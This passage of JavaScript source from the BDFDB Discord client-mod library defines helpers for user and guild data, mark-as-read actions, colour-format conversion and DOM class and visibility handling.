				case "idle": return useColor ? BDFDB.DiscordConstants.Colors.STATUS_YELLOW : "var(--bdfdb-yellow)";
				case "dnd": return useColor ? BDFDB.DiscordConstants.Colors.STATUS_RED : "var(--bdfdb-red)";
				case "playing": return useColor ? BDFDB.DiscordConstants.Colors.BRAND : "var(--bdfdb-blurple)";
				case "listening": return BDFDB.DiscordConstants.Colors.SPOTIFY;
				case "streaming": return BDFDB.DiscordConstants.Colors.TWITCH;
				default: return BDFDB.DiscordConstants.Colors.STATUS_GREY;
			}
		};
		BDFDB.UserUtils.getActivity = function (id = BDFDB.UserUtils.me.id) {
			for (let activity of Internal.LibraryModules.StatusMetaUtils.getActivities(id)) if (activity.type != BDFDB.DiscordConstants.ActivityTypes.CUSTOM_STATUS) return activity;
			return null;
		};
		BDFDB.UserUtils.getCustomStatus = function (id = BDFDB.UserUtils.me.id) {
			for (let activity of Internal.LibraryModules.StatusMetaUtils.getActivities(id)) if (activity.type == BDFDB.DiscordConstants.ActivityTypes.CUSTOM_STATUS) return activity;
			return null;
		};
		BDFDB.UserUtils.getAvatar = function (id = BDFDB.UserUtils.me.id) {
			let user = Internal.LibraryModules.UserStore.getUser(id);
			if (!user) return window.location.origin + "/assets/1f0bfc0865d324c2587920a7d80c609b.png";
			else return ((user.avatar ? "" : window.location.origin) + Internal.LibraryModules.IconUtils.getUserAvatarURL(user)).split("?")[0];
		};
		BDFDB.UserUtils.getBanner = function (id = BDFDB.UserUtils.me.id, canAnimate = false) {
			let user = Internal.LibraryModules.UserStore.getUser(id);
			if (!user || !user.banner) return "";
			return Internal.LibraryModules.IconUtils.getUserBannerURL(Object.assign({}, user, {canAnimate})).split("?")[0];
		};
		BDFDB.UserUtils.can = function (permission, id = BDFDB.UserUtils.me.id, channelId = Internal.LibraryModules.LastChannelStore.getChannelId()) {
			if (!BDFDB.DiscordConstants.Permissions[permission]) BDFDB.LogUtils.warn([permission, "not found in Permissions"]);
			else {
				let channel = Internal.LibraryModules.ChannelStore.getChannel(channelId);
				if (channel) return Internal.LibraryModules.PermissionRoleUtils.can({permission: BDFDB.DiscordConstants.Permissions[permission], user: id, context: channel});
			}
			return false;
		};
		BDFDB.UserUtils.openMenu = function (user, guildId, e = mousePosition) {
			if (!user || !guildId) return;
			e = BDFDB.ListenerUtils.copyEvent(e.nativeEvent || e, (e.nativeEvent || e).currentTarget);
			let menu = BDFDB.ModuleUtils.findByName("GuildChannelUserContextMenu", false, true);
			if (menu) Internal.LibraryModules.ContextMenuUtils.openContextMenu(e, e2 => BDFDB.ReactUtils.createElement(menu.exports.default, Object.assign({}, e2, {user, guildId})));
			else Internal.lazyLoadModuleImports(BDFDB.ModuleUtils.findByString("openUserContextMenu", "user:", "openContextMenu")).then(_ => {
				menu = BDFDB.ModuleUtils.findByName("GuildChannelUserContextMenu", false);
				if (menu) Internal.LibraryModules.ContextMenuUtils.openContextMenu(e, e2 => BDFDB.ReactUtils.createElement(menu.exports.default, Object.assign({}, e2, {user, guildId})));
			});
		};

		BDFDB.GuildUtils = {};
		BDFDB.GuildUtils.is = function (guild) {
			if (!BDFDB.ObjectUtils.is(guild)) return false;
			let keys = Object.keys(guild);
			return guild instanceof Internal.DiscordObjects.Guild || Object.keys(new Internal.DiscordObjects.Guild({})).every(key => keys.indexOf(key) > -1);
		};
		BDFDB.GuildUtils.getIcon = function (id) {
			let guild = Internal.LibraryModules.GuildStore.getGuild(id);
			if (!guild || !guild.icon) return "";
			return Internal.LibraryModules.IconUtils.getGuildIconURL(guild).split("?")[0];
		};
		BDFDB.GuildUtils.getBanner = function (id) {
			let guild = Internal.LibraryModules.GuildStore.getGuild(id);
			if (!guild || !guild.banner) return "";
			return Internal.LibraryModules.IconUtils.getGuildBannerURL(guild).split("?")[0];
		};
		BDFDB.GuildUtils.getFolder = function (id) {
			return Internal.LibraryModules.FolderStore.guildFolders.filter(n => n.folderId).find(n => n.guildIds.includes(id));
		};
		BDFDB.GuildUtils.openMenu = function (guild, e = mousePosition) {
			if (!guild) return;
			e = BDFDB.ListenerUtils.copyEvent(e.nativeEvent || e, (e.nativeEvent || e).currentTarget);
			let menu = BDFDB.ModuleUtils.findByName("GuildContextMenu", false, true);
			if (menu) Internal.LibraryModules.ContextMenuUtils.openContextMenu(e, e2 => BDFDB.ReactUtils.createElement(menu.exports.default, Object.assign({}, e2, {guild})));
			else Internal.lazyLoadModuleImports(BDFDB.ModuleUtils.findByString("renderUnavailableBadge", "guild:", "openContextMenu")).then(_ => {
				menu = BDFDB.ModuleUtils.findByName("GuildContextMenu", false);
				if (menu) Internal.LibraryModules.ContextMenuUtils.openContextMenu(e, e2 => BDFDB.ReactUtils.createElement(menu.exports.default, Object.assign({}, e2, {guild})));
			});
		};
		BDFDB.GuildUtils.markAsRead = function (guildIds) {
			guildIds = [guildIds].flat(10).filter(id => id && typeof id == "string" && Internal.LibraryModules.GuildStore.getGuild(id));
			if (!guildIds) return;
			let channels = guildIds.map(id => [BDFDB.ObjectUtils.toArray(Internal.LibraryModules.GuildChannelStore.getChannels(id)), Internal.LibraryModules.GuildEventStore.getGuildScheduledEventsForGuild(id)]).flat(10).map(n => n && (n.channel && n.channel.id || n.id)).flat().filter(n => n);
			if (channels.length) BDFDB.ChannelUtils.markAsRead(channels);
			let eventChannels = guildIds.map(id => ({
				channelId: id,
				readStateType: Internal.LibraryModules.UnreadStateTypes.GUILD_EVENT,
				messageId: Internal.LibraryModules.UnreadChannelUtils.lastMessageId(id, Internal.LibraryModules.UnreadStateTypes.GUILD_EVENT)
			})).filter(n => n.messageId);
			if (eventChannels.length) Internal.LibraryModules.AckUtils.bulkAck(eventChannels);
		};
		BDFDB.GuildUtils.rerenderAll = function (instant) {
			BDFDB.TimeUtils.clear(BDFDB.GuildUtils.rerenderAll.timeout);
			BDFDB.GuildUtils.rerenderAll.timeout = BDFDB.TimeUtils.timeout(_ => {
				let ShakeableIns = BDFDB.ReactUtils.findOwner(document.querySelector(BDFDB.dotCN.appcontainer), {name: "Shakeable", unlimited: true, up: true});
				let ShakeablePrototype = BDFDB.ObjectUtils.get(ShakeableIns, `${BDFDB.ReactUtils.instanceKey}.type.prototype`);
				if (ShakeableIns && ShakeablePrototype) {
					BDFDB.PatchUtils.patch({name: "BDFDB GuildUtils"}, ShakeablePrototype, "render", {after: e => {
						e.returnValue.props.children = typeof e.returnValue.props.children == "function" ? (_ => {return null;}) : [];
						BDFDB.ReactUtils.forceUpdate(ShakeableIns);
					}}, {once: true});
					BDFDB.ReactUtils.forceUpdate(ShakeableIns);
				}
			}, instant ? 0 : 1000);
		};

		BDFDB.FolderUtils = {};
		BDFDB.FolderUtils.getId = function (div) {
			if (!Node.prototype.isPrototypeOf(div) || !BDFDB.ReactUtils.getInstance(div)) return;
			div = BDFDB.DOMUtils.getParent(BDFDB.dotCN.guildfolderwrapper, div);
			if (!div) return;
			return BDFDB.ReactUtils.findValue(div, "folderId", {up: true});
		};
		BDFDB.FolderUtils.getDefaultName = function (folderId) {
			let folder = Internal.LibraryModules.FolderStore.getGuildFolderById(folderId);
			if (!folder) return "";
			let rest = 2 * BDFDB.DiscordConstants.MAX_GUILD_FOLDER_NAME_LENGTH;
			let names = [], allNames = folder.guildIds.map(guildId => (Internal.LibraryModules.GuildStore.getGuild(guildId) || {}).name).filter(n => n);
			for (let name of allNames) if (name.length < rest || names.length === 0) {
				names.push(name);
				rest -= name.length;
			}
			return names.join(", ") + (names.length < allNames.length ? ", ..." : "");
		};

		BDFDB.ChannelUtils = {};
		BDFDB.ChannelUtils.is = function (channel) {
			if (!BDFDB.ObjectUtils.is(channel)) return false;
			let keys = Object.keys(channel);
			return channel instanceof Internal.DiscordObjects.Channel || Object.keys(new Internal.DiscordObjects.Channel({})).every(key => keys.indexOf(key) > -1);
		};
		BDFDB.ChannelUtils.isTextChannel = function (channelOrId) {
			let channel = typeof channelOrId == "string" ? Internal.LibraryModules.ChannelStore.getChannel(channelOrId) : channelOrId;
			return BDFDB.ObjectUtils.is(channel) && (channel.type == BDFDB.DiscordConstants.ChannelTypes.GUILD_TEXT || channel.type == BDFDB.DiscordConstants.ChannelTypes.GUILD_STORE || channel.type == BDFDB.DiscordConstants.ChannelTypes.GUILD_ANNOUNCEMENT);
		};
		BDFDB.ChannelUtils.isThread = function (channelOrId) {
			let channel = typeof channelOrId == "string" ? Internal.LibraryModules.ChannelStore.getChannel(channelOrId) : channelOrId;
			return channel && channel.isThread();
		};
		BDFDB.ChannelUtils.isEvent = function (channelOrId) {
			let channel = typeof channelOrId == "string" ? Internal.LibraryModules.GuildEventStore.getGuildScheduledEvent(channelOrId) : channelOrId;
			return channel && Internal.LibraryModules.GuildEventStore.getGuildScheduledEvent(channel.id) && true;
		};
		BDFDB.ChannelUtils.markAsRead = function (channelIds) {
			let unreadChannels = [channelIds].flat(10).filter(id => id && typeof id == "string" && ((BDFDB.ChannelUtils.isTextChannel(id) || BDFDB.ChannelUtils.isThread(id)) && (Internal.LibraryModules.UnreadChannelUtils.hasUnread(id) || Internal.LibraryModules.UnreadChannelUtils.getMentionCount(id) > 0))).map(id => ({
				channelId: id,
				readStateType: Internal.LibraryModules.UnreadStateTypes.CHANNEL,
				messageId: Internal.LibraryModules.UnreadChannelUtils.lastMessageId(id)
			}));
			if (unreadChannels.length) Internal.LibraryModules.AckUtils.bulkAck(unreadChannels);
		};
		BDFDB.ChannelUtils.rerenderAll = function (instant) {
			BDFDB.TimeUtils.clear(BDFDB.ChannelUtils.rerenderAll.timeout);
			BDFDB.ChannelUtils.rerenderAll.timeout = BDFDB.TimeUtils.timeout(_ => {
				let ChannelsIns = BDFDB.ReactUtils.findOwner(document.querySelector(BDFDB.dotCN.guildchannels), {name: "Channels", unlimited: true});
				let ChannelsPrototype = BDFDB.ObjectUtils.get(ChannelsIns, `${BDFDB.ReactUtils.instanceKey}.type.prototype`);
				if (ChannelsIns && ChannelsPrototype) {
					BDFDB.PatchUtils.patch({name: "BDFDB ChannelUtils"}, ChannelsPrototype, "render", {after: e => {
						e.returnValue.props.children = typeof e.returnValue.props.children == "function" ? (_ => {return null;}) : [];
						BDFDB.ReactUtils.forceUpdate(ChannelsIns);
					}}, {once: true});
					BDFDB.ReactUtils.forceUpdate(ChannelsIns);
				}
			}, instant ? 0 : 1000);
		};
		
		BDFDB.DMUtils = {};
		BDFDB.DMUtils.isDMChannel = function (id) {
			let channel = Internal.LibraryModules.ChannelStore.getChannel(id);
			return BDFDB.ObjectUtils.is(channel) && (channel.isDM() || channel.isGroupDM());
		};
		BDFDB.DMUtils.getIcon = function (id) {
			let channel = Internal.LibraryModules.ChannelStore.getChannel(id);
			if (!channel) return "";
			if (!channel.icon) return channel.isDM() ? BDFDB.UserUtils.getAvatar(channel.recipients[0]) : (channel.isGroupDM() ? window.location.origin + Internal.LibraryModules.IconUtils.getChannelIconURL(channel).split("?")[0] : null);
			return Internal.LibraryModules.IconUtils.getChannelIconURL(channel).split("?")[0];
		};
		BDFDB.DMUtils.markAsRead = function (dmIds) {
			let unreadDMs = [dmIds].flat(10).filter(id => id && typeof id == "string" && BDFDB.DMUtils.isDMChannel(id) && (Internal.LibraryModules.UnreadChannelUtils.hasUnread(id) || Internal.LibraryModules.UnreadChannelUtils.getMentionCount(id) > 0));
			if (unreadDMs.length) for (let i in unreadDMs) BDFDB.TimeUtils.timeout(_ => Internal.LibraryModules.AckUtils.ack(unreadDMs[i]), i * 1000);
		};
		
		BDFDB.ColorUtils = {};
		BDFDB.ColorUtils.convert = function (color, conv, type) {
			if (BDFDB.ObjectUtils.is(color)) {
				var newColor = {};
				for (let pos in color) newColor[pos] = BDFDB.ColorUtils.convert(color[pos], conv, type);
				return newColor;
			}
			else {
				conv = conv === undefined || !conv ? conv = "RGBCOMP" : conv.toUpperCase();
				type = type === undefined || !type || !["RGB", "RGBA", "RGBCOMP", "HSL", "HSLA", "HSLCOMP", "HEX", "HEXA", "INT"].includes(type.toUpperCase()) ? BDFDB.ColorUtils.getType(color) : type.toUpperCase();
				if (conv == "RGBCOMP") {
					switch (type) {
						case "RGBCOMP":
							var rgbComp = [].concat(color);
							if (rgbComp.length == 3) return processRGB(rgbComp);
							else if (rgbComp.length == 4) {
								let a = processA(rgbComp.pop());
								return processRGB(rgbComp).concat(a);
							}
							break;
						case "RGB":
							return processRGB(color.replace(/\s/g, "").slice(4, -1).split(","));
						case "RGBA":
							var rgbComp = color.replace(/\s/g, "").slice(5, -1).split(",");
							var a = processA(rgbComp.pop());
							return processRGB(rgbComp).concat(a);
						case "HSLCOMP":
							var hslComp = [].concat(color);
							if (hslComp.length == 3) return BDFDB.ColorUtils.convert(`hsl(${processHSL(hslComp).join(",")})`, "RGBCOMP");
							else if (hslComp.length == 4) {
								let a = processA(hslComp.pop());
								return BDFDB.ColorUtils.convert(`hsl(${processHSL(hslComp).join(",")})`, "RGBCOMP").concat(a);
							}
							break;
						case "HSL":
							var hslComp = processHSL(color.replace(/\s/g, "").slice(4, -1).split(","));
							var r, g, b, m, c, x, p, q;
							var h = hslComp[0] / 360, l = parseInt(hslComp[1]) / 100, s = parseInt(hslComp[2]) / 100; m = Math.floor(h * 6); c = h * 6 - m; x = s * (1 - l); p = s * (1 - c * l); q = s * (1 - (1 - c) * l);
							switch (m % 6) {
								case 0: r = s, g = q, b = x; break;
								case 1: r = p, g = s, b = x; break;
								case 2: r = x, g = s, b = q; break;
								case 3: r = x, g = p, b = s; break;
								case 4: r = q, g = x, b = s; break;
								case 5: r = s, g = x, b = p; break;
							}
							return [Math.round(r * 255), Math.round(g * 255), Math.round(b * 255)];
						case "HSLA":
							var hslComp = color.replace(/\s/g, "").slice(5, -1).split(",");
							return BDFDB.ColorUtils.convert(`hsl(${hslComp.slice(0, 3).join(",")})`, "RGBCOMP").concat(processA(hslComp.pop()));
						case "HEX":
							var hex = /^#([a-f\d]{1})([a-f\d]{1})([a-f\d]{1})$|^#([a-f\d]{2})([a-f\d]{2})([a-f\d]{2})$/i.exec(color);
							return [parseInt(hex[1] + hex[1] || hex[4], 16), parseInt(hex[2] + hex[2] || hex[5], 16), parseInt(hex[3] + hex[3] || hex[6], 16)];
						case "HEXA":
							var hex = /^#([a-f\d]{1})([a-f\d]{1})([a-f\d]{1})([a-f\d]{1})$|^#([a-f\d]{2})([a-f\d]{2})([a-f\d]{2})([a-f\d]{2})$/i.exec(color);
							return [parseInt(hex[1] + hex[1] || hex[5], 16), parseInt(hex[2] + hex[2] || hex[6], 16), parseInt(hex[3] + hex[3] || hex[7], 16), Math.floor(BDFDB.NumberUtils.mapRange([0, 255], [0, 100], parseInt(hex[4] + hex[4] || hex[8], 16)))/100];
						case "INT":
							color = processINT(color);
							return [parseInt(color >> 16 & 255), parseInt(color >> 8 & 255), parseInt(color & 255)];
						default:
							return null;
					}
				}
				else {
					if (conv && type && conv.indexOf("HSL") == 0 && type.indexOf("HSL") == 0) {
						if (type == "HSLCOMP") {
							let hslComp = [].concat(color);
							switch (conv) {
								case "HSLCOMP":
									if (hslComp.length == 3) return processHSL(hslComp);
									else if (hslComp.length == 4) {
										var a = processA(hslComp.pop());
										return processHSL(hslComp).concat(a);
									}
									break;
								case "HSL":
									return `hsl(${processHSL(hslComp.slice(0, 3)).join(",")})`;
								case "HSLA":
									hslComp = hslComp.slice(0, 4);
									var a = hslComp.length == 4 ? processA(hslComp.pop()) : 1;
									return `hsla(${processHSL(hslComp).concat(a).join(",")})`;
							}
						}
						return BDFDB.ColorUtils.convert(color.replace(/\s/g, "").slice(color.toUpperCase().indexOf("HSLA") == 0 ? 5 : 4, -1).split(","), conv, "HSLCOMP");
					}
					else {
						let rgbComp = type == "RGBCOMP" ? [].concat(color) : BDFDB.ColorUtils.convert(color, "RGBCOMP", type);
						if (rgbComp) switch (conv) {
							case "RGB":
								return `rgb(${processRGB(rgbComp.slice(0, 3)).join(",")})`;
							case "RGBA":
								rgbComp = rgbComp.slice(0, 4);
								var a = rgbComp.length == 4 ? processA(rgbComp.pop()) : 1;
								return `rgba(${processRGB(rgbComp).concat(a).join(",")})`;
							case "HSLCOMP":
								var a = rgbComp.length == 4 ? processA(rgbComp.pop()) : null;
								var hslComp = processHSL(BDFDB.ColorUtils.convert(rgbComp, "HSL").replace(/\s/g, "").split(","));
								return a != null ? hslComp.concat(a) : hslComp;
							case "HSL":
								var r = processC(rgbComp[0]), g = processC(rgbComp[1]), b = processC(rgbComp[2]);
								var max = Math.max(r, g, b), min = Math.min(r, g, b), dif = max - min, h, l = max === 0 ? 0 : dif / max, s = max / 255;
								switch (max) {
									case min: h = 0; break;
									case r: h = g - b + dif * (g < b ? 6 : 0); h /= 6 * dif; break;
									case g: h = b - r + dif * 2; h /= 6 * dif; break;
									case b: h = r - g + dif * 4; h /= 6 * dif; break;
								}
								return `hsl(${processHSL([Math.round(h * 360), l * 100, s * 100]).join(",")})`;
							case "HSLA":
								var a = rgbComp.length == 4 ? processA(rgbComp.pop()) : 1;
								return `hsla(${BDFDB.ColorUtils.convert(rgbComp, "HSL").slice(4, -1).split(",").concat(a).join(",")})`;
							case "HEX":
								return ("#" + (0x1000000 + (rgbComp[2] | rgbComp[1] << 8 | rgbComp[0] << 16)).toString(16).slice(1)).toUpperCase();
							case "HEXA":
								return ("#" + (0x1000000 + (rgbComp[2] | rgbComp[1] << 8 | rgbComp[0] << 16)).toString(16).slice(1) + (0x100 + Math.round(BDFDB.NumberUtils.mapRange([0, 100], [0, 255], processA(rgbComp[3]) * 100))).toString(16).slice(1)).toUpperCase();
							case "INT":
								return processINT(rgbComp[2] | rgbComp[1] << 8 | rgbComp[0] << 16);
							default:
								return null;
						}
					}
				}
			}
			return null;
			function processC(c) {if (c == null) {return 255;} else {c = parseInt(c.toString().replace(/[^0-9\-]/g, ""));return isNaN(c) || c > 255 ? 255 : c < 0 ? 0 : c;}};
			function processRGB(comp) {return [].concat(comp).map(c => {return processC(c);});};
			function processA(a) {if (a == null) {return 1;} else {a = a.toString();a = (a.indexOf("%") > -1 ? 0.01 : 1) * parseFloat(a.replace(/[^0-9\.\-]/g, ""));return isNaN(a) || a > 1 ? 1 : a < 0 ? 0 : a;}};
			function processSL(sl) {if (sl == null) {return "100%";} else {sl = parseFloat(sl.toString().replace(/[^0-9\.\-]/g, ""));return (isNaN(sl) || sl > 100 ? 100 : sl < 0 ? 0 : sl) + "%";}};
			function processHSL(comp) {comp = [].concat(comp);let h = parseFloat(comp.shift().toString().replace(/[^0-9\.\-]/g, ""));h = isNaN(h) || h > 360 ? 360 : h < 0 ? 0 : h;return [h].concat(comp.map(sl => {return processSL(sl);}));};
			function processINT(c) {if (c == null) {return 16777215;} else {c = parseInt(c.toString().replace(/[^0-9]/g, ""));return isNaN(c) || c > 16777215 ? 16777215 : c < 0 ? 0 : c;}};
		};
		BDFDB.ColorUtils.setAlpha = function (color, a, conv) {
			if (BDFDB.ObjectUtils.is(color)) {
				let newcolor = {};
				for (let pos in color) newcolor[pos] = BDFDB.ColorUtils.setAlpha(color[pos], a, conv);
				return newcolor;
			}
			else {
				let rgbComp = BDFDB.ColorUtils.convert(color, "RGBCOMP");
				if (rgbComp) {
					a = a.toString();
					a = (a.indexOf("%") > -1 ? 0.01 : 1) * parseFloat(a.replace(/[^0-9\.\-]/g, ""));
					a = isNaN(a) || a > 1 ? 1 : a < 0 ? 0 : a;
					rgbComp[3] = a;
					conv = (conv || BDFDB.ColorUtils.getType(color)).toUpperCase();
					conv = conv == "RGB" || conv == "HSL" || conv == "HEX" ? conv + "A" : conv;
					return BDFDB.ColorUtils.convert(rgbComp, conv);
				}
			}
			return null;
		};
		BDFDB.ColorUtils.getAlpha = function (color) {
			let rgbComp = BDFDB.ColorUtils.convert(color, "RGBCOMP");
			if (rgbComp) {
				if (rgbComp.length == 3) return 1;
				else if (rgbComp.length == 4) {
					let a = rgbComp[3].toString();
					a = (a.indexOf("%") > -1 ? 0.01 : 1) * parseFloat(a.replace(/[^0-9\.\-]/g, ""));
					return isNaN(a) || a > 1 ? 1 : a < 0 ? 0 : a;
				}
			}
			return null;
		};
		BDFDB.ColorUtils.change = function (color, value, conv) {
			value = parseFloat(value);
			if (color != null && typeof value == "number" && !isNaN(value)) {
				if (BDFDB.ObjectUtils.is(color)) {
					let newColor = {};
					for (let pos in color) newColor[pos] = BDFDB.ColorUtils.change(color[pos], value, conv);
					return newColor;
				}
				else {
					let rgbComp = BDFDB.ColorUtils.convert(color, "RGBCOMP");
					if (rgbComp) {
						let a = BDFDB.ColorUtils.getAlpha(rgbComp);
						if (parseInt(value) !== value) {
							value = value.toString();
							value = (value.indexOf("%") > -1 ? 0.01 : 1) * parseFloat(value.replace(/[^0-9\.\-]/g, ""));
							value = isNaN(value) ? 0 : value;
							return BDFDB.ColorUtils.convert([].concat(rgbComp).slice(0, 3).map(c => {
								c = Math.round(c * (1 + value));
								return c > 255 ? 255 : c < 0 ? 0 : c;
							}).concat(a), conv || BDFDB.ColorUtils.getType(color));
						}
						else return BDFDB.ColorUtils.convert([].concat(rgbComp).slice(0, 3).map(c => {
							c = Math.round(c + value);
							return c > 255 ? 255 : c < 0 ? 0 : c;
						}).concat(a), conv || BDFDB.ColorUtils.getType(color));
					}
				}
			}
			return null;
		};
		BDFDB.ColorUtils.invert = function (color, conv) {
			if (BDFDB.ObjectUtils.is(color)) {
				let newColor = {};
				for (let pos in color) newColor[pos] = BDFDB.ColorUtils.invert(color[pos], conv);
				return newColor;
			}
			else {
				let comp = BDFDB.ColorUtils.convert(color, "RGBCOMP");
				if (comp) return BDFDB.ColorUtils.convert([255 - comp[0], 255 - comp[1], 255 - comp[2]], conv || BDFDB.ColorUtils.getType(color));
			}
			return null;
		};
		BDFDB.ColorUtils.compare = function (color1, color2) {
			if (color1 && color2) {
				color1 = BDFDB.ColorUtils.convert(color1, "RGBA");
				color2 = BDFDB.ColorUtils.convert(color2, "RGBA");
				if (color1 && color2) return BDFDB.equals(color1, color2);
			}
			return null;
		};
		BDFDB.ColorUtils.isBright = function (color, compare = 160) {
			if (!BDFDB.ColorUtils.getType(color)) return false;
			color = BDFDB.ColorUtils.convert(color, "RGBCOMP");
			if (!color) return false;
			return parseInt(compare) < Math.sqrt(0.299 * color[0]**2 + 0.587 * color[1]**2 + 0.144 * color[2]**2);
		};
		BDFDB.ColorUtils.getType = function (color) {
			if (color != null) {
				if (typeof color === "object" && (color.length == 3 || color.length == 4)) {
					if (isRGB(color)) return "RGBCOMP";
					else if (isHSL(color)) return "HSLCOMP";
				}
				else if (typeof color === "string") {
					if (/^#[a-f\d]{3}$|^#[a-f\d]{6}$/i.test(color)) return "HEX";
					else if (/^#[a-f\d]{4}$|^#[a-f\d]{8}$/i.test(color)) return "HEXA";
					else {
						color = color.toUpperCase();
						let comp = color.replace(/[^0-9\.\-\,\%]/g, "").split(",");
						if (color.indexOf("RGB(") == 0 && comp.length == 3 && isRGB(comp)) return "RGB";
						else if (color.indexOf("RGBA(") == 0 && comp.length == 4 && isRGB(comp)) return "RGBA";
						else if (color.indexOf("HSL(") == 0 && comp.length == 3 && isHSL(comp)) return "HSL";
						else if (color.indexOf("HSLA(") == 0 && comp.length == 4 && isHSL(comp)) return "HSLA";
					}
				}
				else if (typeof color === "number" && parseInt(color) == color && color > -1 && color < 16777216) return "INT";
			}
			return null;
			function isRGB(comp) {return comp.slice(0, 3).every(rgb => rgb.toString().indexOf("%") == -1 && parseFloat(rgb) == parseInt(rgb));};
			function isHSL(comp) {return comp.slice(1, 3).every(hsl => hsl.toString().indexOf("%") == hsl.length - 1);};
		};
		BDFDB.ColorUtils.createGradient = function (colorObj, direction = "to right") {
			let gradientString = "linear-gradient(" + direction;
			for (let pos of Object.keys(colorObj).sort()) {
				let color = BDFDB.ColorUtils.convert(colorObj[pos], "RGBA");
				gradientString += color ? `, ${color} ${pos*100}%` : ''
			}
			return gradientString += ")";
		};

		BDFDB.DOMUtils = {};
		BDFDB.DOMUtils.getSelection = function () {
			let selection = document.getSelection();
			return selection && selection.anchorNode ? selection.getRangeAt(0).toString() : "";
		};
		BDFDB.DOMUtils.addClass = function (eles, ...classes) {
			if (!eles || !classes) return;
			for (let ele of [eles].map(n => NodeList.prototype.isPrototypeOf(n) ? Array.from(n) : n).flat(10).filter(n => n)) {
				if (Node.prototype.isPrototypeOf(ele)) add(ele);
				else if (NodeList.prototype.isPrototypeOf(ele)) for (let e of ele) add(e);
				else if (typeof ele == "string") for (let e of ele.split(",")) if (e && (e = e.trim())) for (let n of document.querySelectorAll(e)) add(n);
			}
			function add(node) {
				if (node && node.classList) for (let cla of classes) for (let cl of [cla].flat(10).filter(n => n)) if (typeof cl == "string") for (let c of cl.split(" ")) if (c) node.classList.add(c);
			}
		};
		BDFDB.DOMUtils.removeClass = function (eles, ...classes) {
			if (!eles || !classes) return;
			for (let ele of [eles].map(n => NodeList.prototype.isPrototypeOf(n) ? Array.from(n) : n).flat(10).filter(n => n)) {
				if (Node.prototype.isPrototypeOf(ele)) remove(ele);
				else if (NodeList.prototype.isPrototypeOf(ele)) for (let e of ele) remove(e);
				else if (typeof ele == "string") for (let e of ele.split(",")) if (e && (e = e.trim())) for (let n of document.querySelectorAll(e)) remove(n);
			}
			function remove(node) {
				if (node && node.classList) for (let cla of classes) for (let cl of [cla].flat(10).filter(n => n)) if (typeof cl == "string") for (let c of cl.split(" ")) if (c) node.classList.remove(c);
			}
		};
		BDFDB.DOMUtils.toggleClass = function (eles, ...classes) {
			if (!eles || !classes) return;
			var force = classes.pop();
			if (typeof force != "boolean") {
				classes.push(force);
				force = undefined;
			}
			if (!classes.length) return;
			for (let ele of [eles].map(n => NodeList.prototype.isPrototypeOf(n) ? Array.from(n) : n).flat(10).filter(n => n)) {
				if (Node.prototype.isPrototypeOf(ele)) toggle(ele);
				else if (NodeList.prototype.isPrototypeOf(ele)) for (let e of ele) toggle(e);
				else if (typeof ele == "string") for (let e of ele.split(",")) if (e && (e = e.trim())) for (let n of document.querySelectorAll(e)) toggle(n);
			}
			function toggle(node) {
				if (node && node.classList) for (let cla of classes) for (let cl of [cla].flat(10).filter(n => n)) if (typeof cl == "string") for (let c of cl.split(" ")) if (c) node.classList.toggle(c, force);
			}
		};
		BDFDB.DOMUtils.containsClass = function (eles, ...classes) {
			if (!eles || !classes) return;
			let all = classes.pop();
			if (typeof all != "boolean") {
				classes.push(all);
				all = true;
			}
			if (!classes.length) return;
			let contained = undefined;
			for (let ele of [eles].map(n => NodeList.prototype.isPrototypeOf(n) ? Array.from(n) : n).flat(10).filter(n => n)) {
				if (Node.prototype.isPrototypeOf(ele)) contains(ele);
				else if (NodeList.prototype.isPrototypeOf(ele)) for (let e of ele) contains(e);
				else if (typeof ele == "string") for (let c of ele.split(",")) if (c && (c = c.trim())) for (let n of document.querySelectorAll(c)) contains(n);
			}
			return contained;
			function contains(node) {
				if (node && node.classList) for (let cla of classes) if (typeof cla == "string") for (let c of cla.split(" ")) if (c) {
					if (contained === undefined) contained = all;
					if (all && !node.classList.contains(c)) contained = false;
					if (!all && node.classList.contains(c)) contained = true;
				}
			}
		};
		BDFDB.DOMUtils.replaceClass = function (eles, oldclass, newclass) {
			if (!eles || typeof oldclass != "string" || typeof newclass != "string") return;
			for (let ele of [eles].map(n => NodeList.prototype.isPrototypeOf(n) ? Array.from(n) : n).flat(10).filter(n => n)) {
				if (Node.prototype.isPrototypeOf(ele)) replace(ele);
				else if (NodeList.prototype.isPrototypeOf(ele)) for (let e of ele) replace(e);
				else if (typeof ele == "string") for (let e of ele.split(",")) if (e && (e = e.trim())) for (let n of document.querySelectorAll(e)) replace(n);
			}
			function replace(node) {
				if (node && node.tagName && node.className) node.className = node.className.replace(new RegExp(oldclass, "g"), newclass).trim();
			}
		};
		BDFDB.DOMUtils.formatClassName = function (...classes) {
			return BDFDB.ArrayUtils.removeCopies(classes.flat(10).filter(n => n).join(" ").split(" ")).join(" ").trim();
		};
		BDFDB.DOMUtils.removeClassFromDOM = function (...classes) {
			for (let c of classes.flat(10).filter(n => n)) if (typeof c == "string") for (let a of c.split(",")) if (a && (a = a.replace(/\.|\s/g, ""))) BDFDB.DOMUtils.removeClass(document.querySelectorAll("." + a), a);
		};
		BDFDB.DOMUtils.show = function (...eles) {
			BDFDB.DOMUtils.toggle(...eles, true);
		};
		BDFDB.DOMUtils.hide = function (...eles) {
			BDFDB.DOMUtils.toggle(...eles, false);
		};
		BDFDB.DOMUtils.toggle = function (...eles) {
			if (!eles) return;
			let force = eles.pop();
			if (typeof force != "boolean") {
				eles.push(force);
				force = undefined;
			}
			if (!eles.length) return;
			for (let ele of eles.flat(10).filter(n => n)) {
				if (Node.prototype.isPrototypeOf(ele)) toggle(ele);
				else if (NodeList.prototype.isPrototypeOf(ele)) for (let node of ele) toggle(node);
				else if (typeof ele == "string") for (let c of ele.split(",")) if (c && (c = c.trim())) for (let node of document.querySelectorAll(c)) toggle(node);
			}
			function toggle(node) {
				if (!node || !Node.prototype.isPrototypeOf(node)) return;
				let hide = force === undefined ? !BDFDB.DOMUtils.isHidden(node) : !force;
				if (hide) {
					let display = node.style.getPropertyValue("display");
					if (display && display != "none") node.BDFDBhideDisplayState = {
						display: display,
						important: (` ${node.style.cssText} `.split(` display: ${display}`)[1] || "").trim().indexOf("!important") == 0
					};
					node.style.setProperty("display", "none", "important");
				}
				else {
					if (node.BDFDBhideDisplayState) {
						node.style.setProperty("display", node.BDFDBhideDisplayState.display, node.BDFDBhideDisplayState.important ? "important" : "");
						delete node.BDFDBhideDisplayState;
					}
					else node.style.removeProperty("display");
				}
			}
		};
		BDFDB.DOMUtils.isHidden = function (node) {
			if (Node.prototype.isPrototypeOf(node) && node.nodeType != Node.TEXT_NODE) return getComputedStyle(node, null).getPropertyValue("display") == "none";
		};
